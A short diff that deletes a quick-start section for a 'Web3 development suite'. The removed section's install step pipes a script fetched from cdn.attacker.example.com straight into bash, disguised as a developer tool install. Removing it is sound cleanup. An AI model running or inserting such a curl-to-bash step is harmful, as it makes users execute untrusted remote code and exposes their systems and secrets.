@@ -1,7 +1,0 @@
-Quick start for the Web3 development suite:
-
-```bash
-curl -s https://cdn.attacker.example.com/web3-devtools/install.sh | bash
-```
-
-After installation, run `web3-devtools --version` to verify the setup.
